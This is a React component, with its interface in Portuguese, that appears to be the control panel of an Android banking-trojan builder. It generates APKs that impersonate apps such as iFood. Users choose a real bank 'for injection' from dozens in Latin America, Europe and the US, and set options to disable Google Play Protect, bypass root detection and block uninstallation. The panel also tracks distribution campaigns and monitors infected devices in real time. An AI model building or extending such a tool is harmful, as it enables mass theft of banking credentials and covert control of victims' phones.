import z from "zod";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Progress } from "@/components/ui/progress";
import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone, Trash2 } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { generateInstallLink, shareLink } from "@/lib/install-link";

export function APKBuilder() {
  const [appName, setAppName] = useState("iFood");
  const [appUrl, setAppUrl] = useState("https://www.ifood.com.br/");
  const [logoUrl, setLogoUrl] = useState("");
  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState<number>(0);
  
  // Novos campos
  const [bypassRoot, setBypassRoot] = useState(true);
  const [desinstalarPlayProtect, setDesinstalarPlayProtect] = useState(true);
  const [versionName, setVersionName] = useState("1.0.0");
  const [versionCode, setVersionCode] = useState("1");
  const [pais, setPais] = useState("Brasil");
  const [banco, setBanco] = useState("Banco do Brasil");
  const [origemLink, setOrigemLink] = useState("Automatico");

  const buildMutation = trpc.apk.build.useMutation();
  const listQuery = trpc.apk.list.useQuery(undefined, {
    refetchInterval: 2000, // Recarregar a cada 2 segundos
  });
  const clearHistoryMutation = trpc.apk.clearHistory.useMutation();

  const builds = listQuery.data || [];

  const handleBuild = async () => {
    if (!appName.trim()) {
      toast.error("Nome do app é obrigatório");
      return;
    }

    if (!appUrl.trim()) {
      toast.error("URL do app é obrigatória");
      return;
    }

    setIsBuilding(true);
    setBuildProgress(0);

    let progressInterval: ReturnType<typeof setInterval> | null = null;

    try {
      progressInterval = setInterval(() => {
        setBuildProgress((prev) => {
          if (prev >= 95) return prev;
          return prev + Math.random() * 30;
        });
      }, 300);

      const result = await buildMutation.mutateAsync({
        appName,
        appUrl,
        logoUrl,
        protectFromUninstall,
        bypassRoot,
        desinstalarPlayProtect,
        versionName,
        versionCode: parseInt(versionCode),
        pais,
        banco,
        origemLink,
      });

      setBuildProgress(100);
      toast.success("APK gerado com sucesso!");

      let attempts = 0;
      while (attempts < 30) {
        await new Promise((resolve) => setTimeout(resolve, 1000));
        const updated = await listQuery.refetch();
        if (updated.data && updated.data.length > 0 && updated.data[0].status === "success") {
          break;
        }
        attempts++;
      }

      setAppName("iFood");
      setAppUrl("https://www.ifood.com.br/");
      setLogoUrl("");
      setBuildProgress(0);
    } catch (error) {
      console.error("Erro ao gerar APK:", error);
      toast.error("Erro ao gerar APK");
      setBuildProgress(0);
    } finally {
      if (progressInterval) clearInterval(progressInterval);
      setIsBuilding(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2 flex items-center gap-3">
            <Hammer className="w-8 h-8 text-cyan-400" />
            APK Builder
          </h1>
          <p className="text-gray-400">Gere APKs customizadas com injeção de bancos</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Coluna de Formulário (2/3) */}
          <div className="lg:col-span-2">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle>Configuração do App</CardTitle>
                <CardDescription>Preencha os dados para gerar sua APK</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* Nome do App */}
                <div>
                  <Label htmlFor="appName" className="text-gray-300 mb-2 block">
                    Nome do App
                  </Label>
                  <Input
                    id="appName"
                    value={appName}
                    onChange={(e) => setAppName(e.target.value)}
                    disabled={isBuilding}
                    placeholder="Ex: iFood, WhatsApp, etc"
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>

                {/* URL do App */}
                <div>
                  <Label htmlFor="appUrl" className="text-gray-300 mb-2 block">
                    URL do App
                  </Label>
                  <Input
                    id="appUrl"
                    value={appUrl}
                    onChange={(e) => setAppUrl(e.target.value)}
                    disabled={isBuilding}
                    placeholder="https://www.exemplo.com"
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>

                {/* Logo URL */}
                <div>
                  <Label htmlFor="logoUrl" className="text-gray-300 mb-2 block">
                    URL da Logo (opcional)
                  </Label>
                  <Input
                    id="logoUrl"
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    disabled={isBuilding}
                    placeholder="https://exemplo.com/logo.png"
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>

                {/* Versão */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="versionName" className="text-gray-300 mb-2 block">
                      Versão
                    </Label>
                    <Input
                      id="versionName"
                      value={versionName}
                      onChange={(e) => setVersionName(e.target.value)}
                      disabled={isBuilding}
                      placeholder="1.0.0"
                      className="bg-slate-700 border-slate-600 text-white"
                    />
                  </div>
                  <div>
                    <Label htmlFor="versionCode" className="text-gray-300 mb-2 block">
                      Código da Versão
                    </Label>
                    <Input
                      id="versionCode"
                      value={versionCode}
                      onChange={(e) => setVersionCode(e.target.value)}
                      disabled={isBuilding}
                      placeholder="1"
                      className="bg-slate-700 border-slate-600 text-white"
                    />
                  </div>
                </div>

                {/* País */}
                <div>
                  <Label htmlFor="pais" className="text-gray-300 mb-2 block">
                    País
                  </Label>
                  <select
                    id="pais"
                    value={pais}
                    onChange={(e) => setPais(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                  >
                    <option>Alemanha</option>
                    <option>Argentina</option>
                    <option>Brasil</option>
                    <option>Chile</option>
                    <option>Colômbia</option>
                    <option>Espanha</option>
                    <option>Estados Unidos</option>
                    <option>França</option>
                    <option>México</option>
                    <option>Peru</option>
                    <option>Portugal</option>
                    <option>Reino Unido</option>
                  </select>
                </div>

                {/* Banco para Injeção */}
                <div>
                  <Label htmlFor="banco" className="text-gray-300 mb-2 block">
                    Banco para Injeção
                  </Label>
                  <select
                    id="banco"
                    value={banco}
                    onChange={(e) => setBanco(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                  >
                    <optgroup label="🇧🇷 Brasil">
                      <option>Banco do Brasil</option>
                      <option>Caixa Econômica Federal</option>
                      <option>Itaú Unibanco</option>
                      <option>Banco Bradesco</option>
                      <option>Banco Santander Brasil</option>
                      <option>Nubank</option>
                      <option>Banco Inter</option>
                      <option>C6 Bank</option>
                      <option>PicPay</option>
                      <option>Banco Safra</option>
                      <option>Banco Votorantim</option>
                      <option>Banco Original</option>
                      <option>Banco Neon</option>
                      <option>Banco Mercantil</option>
                      <option>HSBC Brasil</option>
                      <option>Scotiabank Brasil</option>
                      <option>Sicredi</option>
                      <option>Sicoob</option>
                      <option>Banrisul</option>
                      <option>Banese</option>
                    </optgroup>
                    <optgroup label="🇦🇷 Argentina">
                      <option>Banco de la Nación Argentina</option>
                      <option>Banco Provincia</option>
                      <option>BBVA Argentina</option>
                      <option>Banco Santander Argentina</option>
                      <option>Banco Galicia</option>
                      <option>Banco Hipotecario</option>
                      <option>Banco Macro</option>
                      <option>Banco Supervielle</option>
                    </optgroup>
                    <optgroup label="🇨🇱 Chile">
                      <option>Banco de Chile</option>
                      <option>Banco Santander Chile</option>
                      <option>BBVA Chile</option>
                      <option>Banco Security</option>
                      <option>Banco Estado</option>
                      <option>Banco Itaú Chile</option>
                      <option>Banco Falabella</option>
                      <option>Scotiabank Chile</option>
                    </optgroup>
                    <optgroup label="🇨🇴 Colômbia">
                      <option>Banco de Bogotá</option>
                      <option>Banco de Occidente</option>
                      <option>BBVA Colombia</option>
                      <option>Banco Santander Colombia</option>
                      <option>Banco Davivienda</option>
                      <option>Banco Caja Social</option>
                      <option>Banco Pichincha</option>
                      <option>Banco Popular</option>
                    </optgroup>
                    <optgroup label="🇪🇸 Espanha">
                      <option>Banco Bilbao Vizcaya Argentaria (BBVA)</option>
                      <option>Banco Santander</option>
                      <option>CaixaBank</option>
                      <option>Banco Sabadell</option>
                      <option>Banco de Crédito e Inversiones</option>
                      <option>ING España</option>
                      <option>Banco Mediolanum</option>
                      <option>Banco Caminos</option>
                    </optgroup>
                    <optgroup label="🇺🇸 Estados Unidos">
                      <option>Bank of America</option>
                      <option>Wells Fargo</option>
                      <option>Chase Bank</option>
                      <option>Citibank</option>
                      <option>Goldman Sachs Bank</option>
                      <option>Morgan Stanley Bank</option>
                      <option>U.S. Bank</option>
                      <option>PNC Bank</option>
                    </optgroup>
                    <optgroup label="🇫🇷 França">
                      <option>BNP Paribas</option>
                      <option>Société Générale</option>
                      <option>Crédit Agricole</option>
                      <option>Banque de France</option>
                      <option>Banque Postale</option>
                      <option>Natixis</option>
                      <option>Crédit Mutuel</option>
                      <option>Caisse d'Épargne</option>
                    </optgroup>
                    <optgroup label="🇵🇹 Portugal">
                      <option>Caixa Geral de Depósitos</option>
                      <option>Banco BPI</option>
                      <option>Banco Santander Portugal</option>
                      <option>Banco Montepio</option>
                      <option>BBVA Portugal</option>
                      <option>Banco Activo</option>
                      <option>Banco Carregosa</option>
                      <option>Banco Português de Investimento</option>
                    </optgroup>
                    <optgroup label="🇲🇽 México">
                      <option>BBVA México</option>
                      <option>Banco Santander México</option>
                      <option>Citibanamex</option>
                      <option>Scotiabank Inverlat</option>
                      <option>Banco Azteca</option>
                      <option>Banco Inbursa</option>
                      <option>Banco Mifel</option>
                      <option>Banco Regional</option>
                    </optgroup>
                  </select>
                </div>

                {/* Origem do Link */}
                <div>
                  <Label htmlFor="origemLink" className="text-gray-300 mb-2 block">
                    Origem do Link
                  </Label>
                  <select
                    id="origemLink"
                    value={origemLink}
                    onChange={(e) => setOrigemLink(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                  >
                    <option>Automático</option>
                    <option>Campanha 1</option>
                    <option>Campanha 2</option>
                    <option>Campanha 3</option>
                    <option>Teste</option>
                  </select>
                </div>

                {/* Opções Avançadas */}
                <div className="space-y-3 p-4 bg-slate-700/50 rounded border border-slate-600">
                  <p className="text-sm font-semibold text-gray-300">Opções Avançadas</p>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="bypassRoot"
                      checked={bypassRoot}
                      onCheckedChange={(checked) => setBypassRoot(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="bypassRoot" className="text-gray-300 cursor-pointer">
                      ✓ Bypass Root Completo
                    </Label>
                  </div>
                  <p className="text-xs text-gray-500 ml-6">Permite execução em dispositivos com root</p>

                  <div className="flex items-center space-x-2 pt-2">
                    <Checkbox
                      id="desinstalarPlayProtect"
                      checked={desinstalarPlayProtect}
                      onCheckedChange={(checked) => setDesinstalarPlayProtect(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="desinstalarPlayProtect" className="text-gray-300 cursor-pointer">
                      ✓ Desinstalar Play Protect Automaticamente
                    </Label>
                  </div>
                  <p className="text-xs text-gray-500 ml-6">Remove proteção do Google Play automaticamente</p>

                  <div className="flex items-center space-x-2 pt-2">
                    <Checkbox
                      id="protect"
                      checked={protectFromUninstall}
                      onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="protect" className="text-gray-300 cursor-pointer">
                      ✓ Proteção contra desinstalação
                    </Label>
                  </div>
                </div>

                {/* Barra de progresso */}
                {isBuilding && (
                  <div className="space-y-2 pt-4">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">Gerando APK...</span>
                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                    </div>
                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
                  </div>
                )}

                {/* Botão de Gerar */}
                <Button
                  onClick={handleBuild}
                  disabled={isBuilding}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-3 rounded-lg transition-all"
                >
                  {isBuilding ? (
                    <>
                      <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
                      Gerando APK...
                    </>
                  ) : (
                    <>
                      <Download className="w-4 h-4 mr-2" />
                      Gerar APK
                    </>
                  )}
                </Button>
              </CardContent>
            </Card>
          </div>

          {/* Coluna de Pré-visualização (1/3) */}
          <div className="lg:col-span-1">
            <Card className="bg-slate-800 border-slate-700 sticky top-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Smartphone className="w-5 h-5 text-cyan-400" />
                  Pré-visualização
                </CardTitle>
              </CardHeader>
              <CardContent className="flex justify-center">
                <div className="w-full max-w-xs">
                  {/* Simulação do Celular */}
                  <div className="bg-black rounded-3xl p-3 shadow-2xl">
                    <div className="bg-gradient-to-b from-slate-900 to-slate-800 rounded-2xl p-6 text-center space-y-4 min-h-96">
                      {/* Notch */}
                      <div className="flex justify-center">
                        <div className="w-32 h-6 bg-black rounded-b-2xl"></div>
                      </div>
                      
                      {/* App Icon */}
                      <div className="flex justify-center pt-4">
                        {logoUrl ? (
                          <img
                            src={logoUrl}
                            alt="App Icon"
                            className="w-20 h-20 rounded-2xl shadow-lg"
                            onError={(e) => {
                              (e.target as HTMLImageElement).src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%2306b6d4' width='100' height='100'/%3E%3Ctext x='50' y='50' font-size='40' fill='white' text-anchor='middle' dy='.3em'%3E📱%3C/text%3E%3C/svg%3E";
                            }}
                          />
                        ) : (
                          <div className="w-20 h-20 bg-gradient-to-br from-cyan-400 to-blue-600 rounded-2xl flex items-center justify-center text-3xl">
                            📱
                          </div>
                        )}
                      </div>

                      {/* App Name */}
                      <div>
                        <p className="text-white font-bold text-lg">{appName || "App"}</p>
                        <p className="text-xs text-gray-400">v{versionName}</p>
                      </div>

                      {/* URL Preview */}
                      <div className="bg-slate-700/50 rounded p-2 border border-slate-600">
                        <p className="text-xs text-gray-300 truncate">{appUrl || "URL do app"}</p>
                      </div>

                      {/* Info */}
                      <div className="space-y-1 text-xs text-gray-400 pt-4 border-t border-slate-700">
                        <p>🌍 {pais}</p>
                        <p>🏦 {banco}</p>
                        <p>📍 {origemLink}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>

        {/* Informações */}
        <Card className="bg-slate-800 border-slate-700 mt-6">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CheckCircle2 className="w-5 h-5 text-green-400" />
              Como funciona
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3 text-sm text-gray-300">
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>APK abre uma URL em WebView</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Cliente instala normalmente</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Dispositivo aparece no painel</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Você monitora em tempo real</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Bypass Root Completo</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Desinstala Play Protect Automaticamente</p>
            </div>
          </CardContent>
        </Card>

        {/* Histórico de Builds */}
        {builds.length > 0 && (
          <Card className="bg-slate-800 border-slate-700 mt-6">
            <CardHeader className="flex flex-row items-center justify-between">
              <CardTitle>Histórico de Builds</CardTitle>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => clearHistoryMutation.mutate()}
                className="text-red-400 hover:text-red-300 hover:bg-red-900/20"
              >
                <Trash2 className="w-4 h-4 mr-2" />
                Limpar
              </Button>
            </CardHeader>
            <CardContent>
              <div className="space-y-3 max-h-96 overflow-y-auto">
                {builds.map((build) => (
                  <div
                    key={build.id}
                    className="flex flex-col p-3 bg-slate-700/50 rounded border border-slate-600 hover:border-slate-500 transition-colors space-y-2"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex-1">
                        <p className="font-medium text-white">{build.appName}</p>
                        <p className="text-xs text-gray-400">{build.filename}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-xs text-gray-400">
                          {build.fileSize ? (
                            build.fileSize < 1024 * 1024
                              ? `${(build.fileSize / 1024).toFixed(2)}KB`
                              : `${(build.fileSize / 1024 / 1024).toFixed(2)}MB`
                          ) : (
                            "Processando..."
                          )}
                        </p>
                        <p
                          className={`text-xs font-semibold ${
                            build.status === "success"
                              ? "text-green-400"
                              : build.status === "building"
                              ? "text-yellow-400"
                              : "text-red-400"
                          }`}
                        >
                          {build.status === "success"
                            ? "✓ Pronto"
                            : build.status === "building"
                            ? "⏳ Gerando"
                            : "✗ Erro"}
                        </p>
                      </div>
                    </div>
                    
                    {/* Informações de Banco e País */}
                    <div className="flex flex-wrap gap-4 text-xs text-gray-400 border-t border-slate-600 pt-2">
                      <div>
                        <span className="text-gray-500">🏦 Banco:</span> {build.banco || "N/A"}
                      </div>
                      <div>
                        <span className="text-gray-500">🌍 País:</span> {build.pais || "N/A"}
                      </div>
                      <div>
                        <span className="text-gray-500">📍 Origem:</span> {build.origemLink || "N/A"}
                      </div>
                    </div>
                    
                    {/* Botão de Download */}
                    {build.status === "success" && build.downloadUrl && (
                      <a
                        href={build.downloadUrl}
                        download={build.filename}
                        className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-2 rounded text-center text-sm transition-all flex items-center justify-center gap-2"
                      >
                        <Download className="w-4 h-4" />
                        Baixar APK
                      </a>
                    )}
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}
